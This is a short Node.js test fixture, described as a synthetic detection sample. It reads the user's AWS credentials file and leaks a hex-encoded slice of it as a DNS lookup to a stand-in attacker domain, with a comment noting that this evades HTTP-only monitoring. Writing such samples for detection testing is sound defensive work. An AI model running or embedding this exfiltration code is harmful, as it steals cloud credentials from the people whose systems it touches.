// FIXTURE ONLY — synthetic detection test sample, not real malware
// Shape: read a local cloud credential file, then leak it as DNS labels to an attacker-controlled
// zone. DNS tunnelling dodges detection that only watches HTTP clients.
const dns = require("node:dns");
const fs = require("node:fs");

const creds = fs.readFileSync(process.env.HOME + "/.aws/credentials", "utf8");
const label = Buffer.from(creds).toString("hex").slice(0, 60);
dns.resolve4(label + ".exfil.example.invalid", () => {});
